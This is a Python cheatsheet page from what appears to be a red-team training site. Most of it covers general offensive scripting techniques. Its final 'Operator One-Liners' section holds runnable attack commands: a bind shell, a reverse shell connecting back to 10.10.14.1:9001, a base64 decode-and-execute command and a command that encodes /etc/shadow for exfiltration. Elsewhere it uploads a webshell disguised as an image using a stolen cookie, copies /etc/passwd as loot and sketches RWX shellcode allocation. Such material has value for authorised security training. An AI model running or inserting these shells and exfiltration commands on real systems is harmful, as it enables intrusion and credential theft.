---
layout: training-page
title: "Python Red Team Cheatsheet — Red Team Academy"
module: "Programming"
tags:
  - python
  - cheatsheet
  - red-team
  - offensive-programming
page_key: "prog-python-cheatsheet"
render_with_liquid: false
---

# Python Red Team Cheatsheet

A quick-reference guide for offensive Python programming. Assumes Python 3.11+ and a Linux or Windows operator machine. Sections are ordered by frequency of use during an engagement.

---

## 1. Environment Setup

Keep your red team toolkit isolated per engagement. Use virtual environments and pin versions for reproducibility.

```bash
# Create and activate an isolated environment
python3 -m venv rtenv
source rtenv/bin/activate          # Linux/macOS
rtenv\Scripts\activate             # Windows CMD

# Core offensive libraries
pip install \
    scapy \
    impacket \
    requests \
    pycryptodome \
    cryptography \
    paramiko \
    ldap3 \
    dnspython \
    colorama \
    beautifulsoup4 \
    lxml

# Freeze for reproducibility
pip freeze > requirements.txt
pip install -r requirements.txt
```

**Key libraries at a glance:**

| Library | Purpose |
|---|---|
| `scapy` | Packet crafting, sniffing, spoofing |
| `impacket` | SMB, Kerberos, NTLM, DCE/RPC |
| `pycryptodome` | AES, RSA, hashing — drop-in for PyCrypto |
| `cryptography` | Modern hazmat primitives, Fernet |
| `paramiko` | SSH client/server, SFTP |
| `ldap3` | LDAP/AD enumeration |
| `dnspython` | DNS queries, AXFR zone transfers |
| `colorama` | Cross-platform ANSI color in terminal |

---

## 2. Socket Programming

### Raw TCP client

```python
import socket

def tcp_connect(host: str, port: int, data: bytes = b"") -> bytes:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        s.connect((host, port))
        if data:
            s.sendall(data)
        return s.recv(4096)

banner = tcp_connect("192.168.1.10", 21)
print(banner.decode(errors="replace"))
```

### Raw UDP sender

```python
import socket

def udp_send(host: str, port: int, payload: bytes) -> bytes | None:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.settimeout(3)
        s.sendto(payload, (host, port))
        try:
            data, _ = s.recvfrom(4096)
            return data
        except socket.timeout:
            return None
```

### Non-blocking socket with `select` multiplexing

Useful when managing multiple connections without threads.

```python
import select, socket

def multi_recv(socks: list[socket.socket], timeout: float = 1.0) -> dict:
    results = {}
    readable, _, _ = select.select(socks, [], [], timeout)
    for s in readable:
        try:
            data = s.recv(4096)
            results[s.getpeername()] = data
        except OSError:
            pass
    return results
```

### Binary protocol framing with `struct`

```python
import struct

# Pack a 4-byte big-endian length prefix + payload
def frame(payload: bytes) -> bytes:
    return struct.pack(">I", len(payload)) + payload

# Unpack: read header then body
def unframe(data: bytes) -> tuple[int, bytes]:
    length = struct.unpack(">I", data[:4])[0]
    return length, data[4:4 + length]

# Common format codes
# B = uint8, H = uint16, I = uint32, Q = uint64
# s = bytes, x = pad byte
# > = big-endian, < = little-endian, = = native
header = struct.pack(">BHI", 0xDE, 0xADBE, 0xEF000001)
```

---

## 3. Subprocess & OS Interaction

### subprocess.run — simple execution

```python
import subprocess, shlex

def run_cmd(cmd: str, timeout: int = 30) -> tuple[int, str, str]:
    """Run a shell command, return (returncode, stdout, stderr)."""
    result = subprocess.run(
        shlex.split(cmd),
        capture_output=True,
        text=True,
        timeout=timeout,
    )
    return result.returncode, result.stdout, result.stderr

rc, out, err = run_cmd("id")
print(out.strip())
```

### subprocess.Popen — interactive/streaming

```python
import subprocess, threading

def stream_output(cmd: list[str]) -> None:
    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )
    for line in iter(proc.stdout.readline, ""):
        print(line, end="", flush=True)
    proc.wait()

stream_output(["nmap", "-sV", "--open", "192.168.1.0/24"])
```

### Environment & filesystem utilities

```python
import os, shutil, tempfile, pathlib

# Read env vars (token exfil, config discovery)
home = os.getenv("HOME", "/tmp")
path = os.environ.get("PATH", "")

# Temporary staging directory — auto-cleaned on exit
with tempfile.TemporaryDirectory() as staging:
    dst = pathlib.Path(staging) / "loot.bin"
    shutil.copy2("/etc/passwd", dst)
    print(dst.read_bytes()[:50])

# Recursive copy with permission preservation
shutil.copytree("/opt/target/config", "/tmp/loot/config", dirs_exist_ok=True)
```

---

## 4. Binary Manipulation

### ctypes — calling native libraries

```python
import ctypes, ctypes.util

# Load libc on Linux
libc = ctypes.CDLL(ctypes.util.find_library("c"))
libc.puts(b"hello from libc")

# Allocate a mutable buffer
buf = ctypes.create_string_buffer(256)
buf.value = b"shellcode_placeholder"
print(bytes(buf[:21]))

# Cast to function pointer (concept — do not run arbitrary shellcode)
# shellcode_ptr = ctypes.cast(buf, ctypes.CFUNCTYPE(None))
```

### ctypes on Windows (WinDLL)

```python
import ctypes, sys

if sys.platform == "win32":
    kernel32 = ctypes.windll.kernel32
    advapi32 = ctypes.windll.advapi32

    # Get current PID
    pid = kernel32.GetCurrentProcessId()
    print(f"PID: {pid}")

    # Allocate virtual memory (concept)
    MEM_COMMIT  = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_RWX    = 0x40
    size = 4096
    addr = kernel32.VirtualAlloc(None, size, MEM_COMMIT | MEM_RESERVE, PAGE_RWX)
    print(f"Allocated at: {hex(addr)}")
```

### struct.pack / unpack — binary parsing

```python
import struct

# Parse a 20-byte TCP-like header
raw = bytes.fromhex("0050005001c8000000000000000000000000000000000000")
src_port, dst_port, seq, ack, off_flags, win = struct.unpack(">HHIIBB H", raw[:14])
print(f"SRC={src_port} DST={dst_port} SEQ={seq}")

# Mutate bytes via bytearray
payload = bytearray(b"\x00\x01\x02\x03\x04")
payload[0] = 0xFF
payload[2:4] = b"\xDE\xAD"
print(payload.hex())
```

---

## 5. HTTP Exploitation

### Persistent session with custom headers

```python
import requests

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Accept-Language": "en-US,en;q=0.9",
    "X-Forwarded-For": "127.0.0.1",
})

# Authenticate and reuse cookies
resp = session.post("https://target.local/login", data={
    "username": "admin",
    "password": "Password1!",
}, verify=False, timeout=10)
resp.raise_for_status()
print(session.cookies.get_dict())
```

### Proxy through Burp Suite or SOCKS5

```python
import requests

proxies_burp = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
proxies_socks = {"http": "socks5h://127.0.0.1:1080", "https": "socks5h://127.0.0.1:1080"}

resp = requests.get("https://target.local/api/users", proxies=proxies_burp, verify=False)
```

### Multipart file upload

```python
import requests

with open("/tmp/webshell.php", "rb") as fh:
    files = {"file": ("image.php", fh, "image/jpeg")}
    data  = {"action": "upload", "path": "/uploads/"}
    resp = requests.post(
        "https://target.local/admin/upload",
        files=files,
        data=data,
        cookies={"session": "stolen_token"},
        verify=False,
    )
print(resp.status_code, resp.text[:200])
```

### Cookie jar manipulation

```python
import requests
from http.cookiejar import MozillaCookieJar

jar = MozillaCookieJar("/tmp/cookies.txt")
jar.save()

session = requests.Session()
session.cookies = jar
session.get("https://target.local/dashboard", verify=False)
jar.save()  # persist for later use
```

---

## 6. Cryptography

### AES-CBC encryption (pycryptodome)

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

KEY = get_random_bytes(32)   # AES-256
IV  = get_random_bytes(16)

def aes_encrypt(plaintext: bytes) -> bytes:
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    return IV + cipher.encrypt(pad(plaintext, AES.block_size))

def aes_decrypt(ciphertext: bytes) -> bytes:
    iv, ct = ciphertext[:16], ciphertext[16:]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), AES.block_size)

ct = aes_encrypt(b"exfiltrated data here")
print(aes_decrypt(ct))
```

### AES-GCM (authenticated encryption)

```python
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

KEY = get_random_bytes(32)

def gcm_encrypt(plaintext: bytes) -> tuple[bytes, bytes, bytes]:
    nonce = get_random_bytes(16)
    cipher = AES.new(KEY, AES.MODE_GCM, nonce=nonce)
    ct, tag = cipher.encrypt_and_digest(plaintext)
    return nonce, tag, ct

def gcm_decrypt(nonce: bytes, tag: bytes, ct: bytes) -> bytes:
    cipher = AES.new(KEY, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(ct, tag)  # raises ValueError on tamper
```

### Fernet symmetric encryption (cryptography)

```python
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
import base64, os

def derive_key(password: str, salt: bytes | None = None) -> tuple[bytes, Fernet]:
    salt = salt or os.urandom(16)
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=480_000)
    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
    return salt, Fernet(key)

salt, f = derive_key("s3cr3tpass")
token = f.encrypt(b"beacon config blob")
plain = f.decrypt(token)
```

### RSA key generation & encryption (hazmat)

```python
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization

private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key  = private_key.public_key()

ciphertext = public_key.encrypt(
    b"session key",
    padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None),
)
plaintext = private_key.decrypt(
    ciphertext,
    padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None),
)
```

---

## 7. CLI Tool Structure

### argparse with subcommands

```python
import argparse, logging, sys
from colorama import Fore, Style, init as colorama_init

colorama_init(autoreset=True)

def setup_logging(verbose: bool) -> None:
    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(format="%(asctime)s %(levelname)s %(message)s", level=level)

def cmd_scan(args: argparse.Namespace) -> int:
    logging.info(f"{Fore.GREEN}[*]{Style.RESET_ALL} Scanning {args.target}:{args.port}")
    # ... scan logic ...
    return 0

def cmd_dump(args: argparse.Namespace) -> int:
    logging.info(f"{Fore.YELLOW}[!]{Style.RESET_ALL} Dumping {args.table}")
    return 0

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Red Team Tool")
    parser.add_argument("-v", "--verbose", action="store_true")
    sub = parser.add_subparsers(dest="command", required=True)

    scan_p = sub.add_parser("scan", help="Port scan target")
    scan_p.add_argument("-t", "--target", required=True)
    scan_p.add_argument("-p", "--port", type=int, default=80)
    scan_p.set_defaults(func=cmd_scan)

    dump_p = sub.add_parser("dump", help="Dump database table")
    dump_p.add_argument("--table", required=True)
    dump_p.set_defaults(func=cmd_dump)

    return parser

def main() -> None:
    parser = build_parser()
    args = parser.parse_args()
    setup_logging(args.verbose)
    sys.exit(args.func(args))

if __name__ == "__main__":
    main()
```

---

## 8. Concurrency

### Thread pool with Queue (I/O-bound tasks)

```python
import threading, queue

def worker(task_queue: queue.Queue, results: list, lock: threading.Lock) -> None:
    while True:
        try:
            item = task_queue.get(timeout=1)
        except queue.Empty:
            break
        result = f"processed:{item}"       # replace with real work
        with lock:
            results.append(result)
        task_queue.task_done()

def parallel_run(items: list, num_threads: int = 20) -> list:
    q: queue.Queue = queue.Queue()
    results: list = []
    lock = threading.Lock()
    for item in items:
        q.put(item)
    threads = [threading.Thread(target=worker, args=(q, results, lock), daemon=True)
               for _ in range(num_threads)]
    for t in threads:
        t.start()
    q.join()
    return results
```

### asyncio for async I/O (port scanning pattern)

```python
import asyncio

async def probe(host: str, port: int, sem: asyncio.Semaphore, timeout: float = 2.0) -> tuple[str, int, bool]:
    async with sem:
        try:
            _, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)
            writer.close()
            await writer.wait_closed()
            return host, port, True
        except (OSError, asyncio.TimeoutError):
            return host, port, False

async def scan_range(host: str, ports: range, concurrency: int = 500) -> list[int]:
    sem = asyncio.Semaphore(concurrency)
    tasks = [probe(host, p, sem) for p in ports]
    results = await asyncio.gather(*tasks)
    return [port for _, port, open_ in results if open_]

open_ports = asyncio.run(scan_range("192.168.1.1", range(1, 1025)))
print(open_ports)
```

### multiprocessing for CPU-bound work

```python
from multiprocessing import Pool, cpu_count

def hash_candidate(word: str) -> tuple[str, str]:
    import hashlib
    return word, hashlib.md5(word.encode()).hexdigest()

def crack_md5(target_hash: str, wordlist: list[str]) -> str | None:
    with Pool(cpu_count()) as pool:
        for word, digest in pool.imap_unordered(hash_candidate, wordlist, chunksize=500):
            if digest == target_hash:
                pool.terminate()
                return word
    return None
```

---

## 9. Windows-Specific

### Registry access via winreg

```python
import sys
if sys.platform == "win32":
    import winreg

    def read_registry(hive, path: str, value: str) -> str | None:
        try:
            key = winreg.OpenKey(hive, path, access=winreg.KEY_READ)
            data, _ = winreg.QueryValueEx(key, value)
            winreg.CloseKey(key)
            return str(data)
        except FileNotFoundError:
            return None

    # Read current user run keys (persistence check)
    run_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    val = read_registry(winreg.HKEY_CURRENT_USER, run_key, "OneDrive")
    print(val)

    # Enumerate all run key entries
    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                         r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
    i = 0
    while True:
        try:
            name, data, _ = winreg.EnumValue(key, i)
            print(f"  {name} = {data}")
            i += 1
        except OSError:
            break
```

### advapi32 — privilege enumeration

```python
import ctypes, sys
if sys.platform == "win32":
    TOKEN_QUERY = 0x0008
    kernel32  = ctypes.windll.kernel32
    advapi32  = ctypes.windll.advapi32

    h_token = ctypes.c_void_p()
    proc = kernel32.GetCurrentProcess()
    advapi32.OpenProcessToken(proc, TOKEN_QUERY, ctypes.byref(h_token))
    # Use LookupPrivilegeName / GetTokenInformation to enumerate token privileges
    kernel32.CloseHandle(h_token)
```

### WMI query (wmi module — Windows only)

```python
import sys
if sys.platform == "win32":
    import wmi
    c = wmi.WMI()

    # Enumerate running processes
    for proc in c.Win32_Process():
        print(f"PID={proc.ProcessId:6d}  {proc.Name}")

    # Installed software
    for pkg in c.Win32_Product():
        print(f"{pkg.Name} {pkg.Version}")
```

---

## 10. Operator One-Liners

Quick Python expressions and short scripts for in-the-field use.

```bash
# HTTP server for file delivery
python3 -m http.server 8080 --bind 0.0.0.0

# Bind shell (listen on 4444, execute /bin/sh) — Linux
python3 -c "import socket,subprocess,os;s=socket.socket();s.bind(('0.0.0.0',4444));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(['/bin/sh'])"

# Base64 decode and execute a string payload
python3 -c "import base64,subprocess;subprocess.run(base64.b64decode('aWQ=').decode(),shell=True)"

# Reverse shell (connect-back to 10.10.14.1:9001)
python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('10.10.14.1',9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh'])"

# List files recursively and print size
python3 -c "import pathlib;[print(p,p.stat().st_size) for p in pathlib.Path('.').rglob('*') if p.is_file()]"

# Encode file to base64 for exfil via DNS/HTTP
python3 -c "import base64,sys;print(base64.b64encode(open(sys.argv[1],'rb').read()).decode())" /etc/shadow

# Simple ICMP reachability check via scapy (requires root)
python3 -c "from scapy.all import sr1,IP,ICMP;r=sr1(IP(dst='8.8.8.8')/ICMP(),timeout=2,verbose=0);print('up' if r else 'down')"

# Port check one-liner
python3 -c "import socket;s=socket.socket();s.settimeout(2);print(s.connect_ex(('192.168.1.1',445)))"

# Grab banner from any TCP service
python3 -c "import socket;s=socket.socket();s.connect(('192.168.1.10',22));print(s.recv(256))"

# Generate a random alphanumeric password
python3 -c "import random,string;print(''.join(random.choices(string.ascii_letters+string.digits,k=24)))"
```

---

## Resources

- Python 3.11 docs: https://docs.python.org/3.11/
- pycryptodome: https://pycryptodome.readthedocs.io/
- cryptography (hazmat): https://cryptography.io/en/latest/
- scapy: https://scapy.readthedocs.io/
- impacket GitHub: https://github.com/fortra/impacket
- paramiko: https://www.paramiko.org/
- ldap3: https://ldap3.readthedocs.io/
- dnspython: https://www.dnspython.org/
- requests: https://requests.readthedocs.io/
- colorama: https://pypi.org/project/colorama/
